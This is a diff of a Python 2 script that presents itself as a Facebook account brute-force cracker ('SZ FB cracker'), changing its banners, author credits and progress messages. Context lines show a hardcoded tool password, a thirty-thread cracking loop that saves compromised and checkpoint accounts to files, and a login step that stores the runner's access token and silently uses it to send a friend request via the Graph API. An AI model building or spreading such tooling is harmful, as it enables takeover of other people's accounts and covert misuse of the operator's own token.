@@ -66,15 +66,15 @@ logo = """
            `---'           
                            
 
-*Do everything on your own risk.
- I am not responsible for any illegal activities.
+ *Do everything on your own risk.
+ *I am not responsible for any illegal activities.
   -------------
   🅂🄰🄺🄷🄰🅆🄰🅃
 \033[1;91m=======================================
 \033[1;96mAuthor    \033[1;93m: \033[1;92mSakhawat Hossain
-\033[1;96mInstagram \033[1;93m: \033[1;mSakhawat Hossain
-\033[1;96mFacebook  \033[1;93m: \033[1;mwww.facebook.com/sakhawat1926
-\033[1;9mYouTube    \033[1;93m: \033[1;92mTiPS&TRiCKS 360
+\033[1;96mInstagram \033[1;93m: \033[1;92mSakhawat Hossain
+\033[1;96mFacebook  \033[1;93m: \033[1;92mwww.facebook.com/sakhawat1926
+\033[1;96mYouTube    \033[1;93m: \033[1;92mTiPS&TRiCKS 360
 \033[1;91m======================================="""
 
 def tik():
@@ -93,23 +93,23 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
-print "\033[1;96m ============================================================="
+print "\033[1;93m ===================================================="
 print  """\033[1;91m=======================================
 \033[1;96mAuthor    \033[1;93m: \033[1;92mSakhawat Hossain
 \033[1;96mInstagram \033[1;93m: \033[1;92mSakhawat Hossain
 \033[1;96mFacebook  \033[1;93m: \033[1;92mwww.facebook.com/sakhawat1926
 \033[1;96mYouTube   \033[1;93m: \033[1;92mTiPS&TRiCKS 360
 \033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
+print " \x1b[1;93m====================================================="
 
 CorrectUsername = "Sakhawat"
 CorrectPassword = "1926"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
+    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m: ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
+    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m: ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -159,7 +159,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -204,8 +204,8 @@ def menu():
 	os.system("clear")
 	print logo
 	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93mFB Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93mFB ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
@@ -301,7 +301,7 @@ def pilih_super():
 	jalan('\033[1;96m[✺] \033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mSZ FB cracker is trying to crack please keep patience \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
 	print 42*"\033[1;96m="
@@ -424,7 +424,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSZ FB cracker has completed the cracking process \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
